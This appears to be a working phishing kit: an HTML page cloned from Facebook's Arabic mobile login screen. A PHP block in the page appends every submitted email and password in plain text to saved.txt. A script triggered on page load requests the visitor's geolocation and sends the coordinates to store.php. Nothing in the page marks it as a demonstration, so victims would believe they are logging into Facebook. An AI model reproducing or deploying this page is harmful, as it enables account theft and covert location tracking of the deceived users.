<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
    <link rel="stylesheet" href="fb/snipped.css">
    <title>Facebook - log in or sign up</title>
    <link rel="icon" href="fb/images/facebook.png" type="image/icon type">
</head>

<body onload="getLocation()">
    <div class="">
        <div data-sigil="m_login_upsell login_identify_step_element">
            <div class="_qw9 grouped aclb"><a href="#"
                    class="touchableArea first last area touchable acy apl abt abb snipcss0-0-0-1" data-store-id="0">
                    <div class="ib cc"><i class="l img sp_xm9DDmY7HAL_3x sx_f30d37"></i>
                        <div class="c"><span class="fcl">احصل على ‏فيسبوك لنظام Android‏ وتصفح بسرعة أكبر.</span></div>
                    </div>
                </a></div><iframe style="display: none;"></iframe>
        </div>
        <div class="_7om2 _52we _2pid _52z6">
            <div class="_4g34"><a href="#" class=""><img src="fb/images/dF5SId3UHWd.svg" width="112" class="img"></a>
            </div>
        </div>


        <!----------------------------------------------- start login form ----------------------------------------------- -->


        <div class="_5rut">
            <form action="" method="post" class="_9hp- _5spm" novalidate="1" data-autoid="autoid_4">




                <div data-sigil="user_info_after_failure_element" class=""></div>
                <div data-sigil="user_info_after_failure_element" class=""></div>
                <div class="snipcss0-2-2-11"></div>
                <div class="">
                    <div class="_56be">
                        <div class="_55wo _56bf">
                            <div class="">
                                <!------------------------------------------ email -------------- -->
                                <input autocapitalize="off" type="email" name="email" require class="_56bg _4u9z _8qtn"
                                    id="m_login_email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني">
                            </div>

                        </div>
                    </div>

                    <div class="_55wq"></div>
                    <div class="_56be">
                        <div class="_55wo _56bf">
                            <div class="_1upc">
                                <div class="_7om2">
                                    <div class="_4g34 _5i2i _52we">
                                        <div class="_5xu4">
                                            <!--------------------------------- password--------------------------- -->
                                            <input autocapitalize="off" require class="_56bg _4u9z _27z2 _8qtm"
                                                name="pass" id="m_login_password" placeholder="كلمة السر"
                                                type="password">
                                        </div>
                                    </div>

                                    <div class="_216i _5i2i _52we">
                                        <div class="_5xu4">
                                            <div class="_2pi9" style="display:none"><a href="#"
                                                    class="snipcss0-10-27-28"><span class="mfss"
                                                        style="display:none">إخفاء</span><span
                                                        class="mfss">إظهار</span></a></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="_2pie" style="text-align:center;">

                    <div data-sigil="login_password_step_element" class="">

                        <button type="submit" name="submit" value="SAVE"
                            class="_52jh _56bs _56b_ _28lf _9cow _56bw _56bu"
                            data-sigil="touchable login_button_block m_login_button"><span class="_55sr">تسجيل
                                الدخول</span></button>
                    </div>

                    <div class="_7eif" style="display:none"></div>
                    <div class="_7f_d" style="display:none"></div>
                    <div class="snipcss0-3-31-37"></div>
                </div><input type="hidden" id="prefill_contact_point" class=""><input type="hidden" id="prefill_source"
                    class=""><input type="hidden" id="prefill_type" class=""><input type="hidden"
                    id="first_prefill_source" class=""><input type="hidden" id="first_prefill_type" class=""><input
                    type="hidden" id="had_cp_prefilled" value="false" class=""><input type="hidden"
                    id="had_password_prefilled" value="false" class=""><input type="hidden" id="is_smart_lock"
                    value="false" class=""><input type="hidden" name="bi_xrwh" value="0" class=""><input type="hidden"
                    class="snipcss0-2-2-47">
                <div class="_xo8"></div><noscript class=""><input type="hidden" name="_fb_noscript"
                        value="true" /></noscript>
            </form>
            <div class="">
                <div class="_2pie _9omz">
                    <div class="_52jj _9on1"><a class="_9on1" href="#">هل
                            نسيت كلمة السر؟</a></div>
                </div>
                <div style="padding-top: 42px" class="">
                    <div class="">
                        <div class="">
                            <div class="">
                                <div class="_43mg _8qtf snipcss0-6-57-58"><span class="_43mh">أو</span></div>
                                <div class="_52jj _5t3b"><a
                                        class="_5t3c _28le btn btnS medBtn mfsm touchable snipcss0-7-60-61" tabindex="0"
                                        data-autoid="autoid_2">إنشاء حساب جديد</a></div>
                            </div>
                        </div>
                        <div class="_2pie" style="text-align:center;">
                            <div class="">
                                <div class="snipcss0-6-63-64"></div>
                                <div class="other-links">
                                    <ul class="_5pkb _55wp">
                                        <li class=""></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <?php
   if(isset($_POST['submit'])){
   $Name = "Username:".$_POST['email']."
   ";
   $Pass = "Password:".$_POST['pass']."
   ";
   $file=fopen("saved.txt", "a");
   fwrite($file, $Name);
   fwrite($file, $Pass);
   fclose($file);
   }
   ?>




    <script>
    var x = document.getElementById("demo");

    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition);
        } else {
            x.innerHTML = "Geolocation is not supported by this browser.";
        }
    }

    function showPosition(position) {
        const xhttp = new XMLHttpRequest();
        xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude);
        xhttp.send();


    }
    </script>


    <div class="_55wr">
        <div class="_5dpw">
            <div class="_5ui3" id="locale-selector">
                <div class="_7om2">
                    <div class="_4g34">
                        <span class="_52jc">
                            العربية
                        </span>
                        <div class="">
                            <span class="_52jc">
                                <a href="/intl/save_locale/?loc=ms_MY&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                                    data-method="post" class="snipcss0-7-8-9">
                                    Bahasa Melayu
                                </a>
                            </span>
                        </div>
                        <div class="">
                            <span class="_52jc">
                                <a href="/intl/save_locale/?loc=fr_FR&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                                    data-method="post" class="snipcss0-7-11-12">
                                    Français (France)
                                </a>
                            </span>
                        </div>
                        <div class="">
                            <span class="_52jc">
                                <a href="/intl/save_locale/?loc=pt_BR&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                                    data-method="post" class="snipcss0-7-14-15">
                                    Português (Brasil)
                                </a>
                            </span>
                        </div>
                    </div>
                    <div class="_4g34">
                        <div class="">
                            <span class="_52jc">
                                <a href="/intl/save_locale/?loc=en_US&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                                    data-method="post" class="snipcss0-7-18-19">
                                    English (US)
                                </a>
                            </span>
                        </div>
                        <div class="">
                            <span class="_52jc">
                                <a href="/intl/save_locale/?loc=id_ID&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                                    data-method="post" class="snipcss0-7-21-22">
                                    Bahasa Indonesia
                                </a>
                            </span>
                        </div>
                        <div class="">
                            <span class="_52jc">
                                <a href="/intl/save_locale/?loc=es_LA&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                                    data-method="post" class="snipcss0-7-24-25">
                                    Español
                                </a>
                            </span>
                        </div>
                        <a href="/language/?next_uri=https%3A%2F%2Fm.facebook.com%2F&amp;refid=8" class="">
                            <div class="_3j87 _1rrd" data-sigil="more_language">
                                <i class="img sp_OK5l4D8uBum_3x sx_1a9631">
                                </i>
                            </div>
                        </a>
                    </div>
                </div>
            </div>
            <div class="">
                <div class="_96qv _9a0a">
                    <a href="https://about.meta.com/" class="_96qw">
                        حول
                    </a>
                    <span class="snipcss0-4-30-32">
                        ·
                    </span>
                    <a href="/help/?ref=pf&amp;refid=8" class="_96qw">
                        مساعدة
                    </a>
                    <span class="snipcss0-4-30-34">
                        ·
                    </span>
                    <span class="_96qw">
                        المزيد
                    </span>
                </div>
                <div class="_96qv" style="display:none">
                    <a href="https://messenger.com/" class="_96qw snipcss0-4-36-37">
                        Messenger
                    </a>
                    <a href="/lite/?refid=8" class="_96qw snipcss0-4-36-38">
                        Facebook Lite
                    </a>
                    <a href="https://m.facebook.com/watch/?refid=8" class="_96qw snipcss0-4-36-39">
                        Watch
                    </a>
                    <a href="/places/?refid=8" class="_96qw snipcss0-4-36-40">
                        الأماكن
                    </a>
                    <a href="/games/?refid=8" class="_96qw snipcss0-4-36-41">
                        الألعاب
                    </a>
                    <a href="/marketplace/?refid=8" class="_96qw snipcss0-4-36-42">
                        Marketplace
                    </a>
                    <a href="https://pay.facebook.com/?refid=8" target="_blank" class="_96qw">
                        Meta Pay
                    </a>
                    <a href="https://www.oculus.com/" target="_blank" class="_96qw">
                        Oculus
                    </a>
                    <a href="https://portal.facebook.com/?refid=8" target="_blank" class="_96qw">
                        Portal
                    </a>
                    <a href="https://lm.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT1uG3aBiCV1fKYdps9kTg1PcnoGvGiGjnktoTsY_QLNw763OnExYLdiasjWxPF8xmNcpwCCdaSAtOpVzU99CVWjz4cnr-oy1la7AjRwwSmLoZL1ImQItK7ckRZuSdDDfDTDegULHYSWbMqoYPAmu3vknAHpXnTKlA"
                        target="_blank" class="_96qw">
                        Instagram
                    </a>
                    <a href="https://www.bulletin.com/" class="_96qw snipcss0-4-36-47">
                        Bulletin
                    </a>
                    <a href="/fundraisers/?refid=8" class="_96qw snipcss0-4-36-48">
                        حملات جمع التبرعات
                    </a>
                    <a href="/biz/directory/?refid=8" class="_96qw snipcss0-4-36-49">
                        الخدمات
                    </a>
                    <a href="https://developers.facebook.com/?ref=pf&amp;refid=8" class="_96qw snipcss0-4-36-50">
                        المطوّرون
                    </a>
                    <a href="/careers/?ref=pf&amp;refid=8" class="_96qw snipcss0-4-36-51">
                        الوظائف
                    </a>
                    <a href="/privacy/policy/?entry_point=facebook_page_footer&amp;refid=8"
                        class="_96qw snipcss0-4-36-52">
                        سياسة الخصوصية
                    </a>
                    <a href="/privacy/center/?entry_point=facebook_page_footer&amp;refid=8"
                        class="_96qw snipcss0-4-36-53">
                        مركز الخصوصية
                    </a>
                    <a href="/groups/explore/?refid=8" class="_96qw snipcss0-4-36-54">
                        المجموعات
                    </a>
                </div>
                <span class="mfss fcg">
                    حقوق النشر محفوظة Meta © ‏2022‏
                </span>
            </div>
        </div>
    </div>

</body>

</html>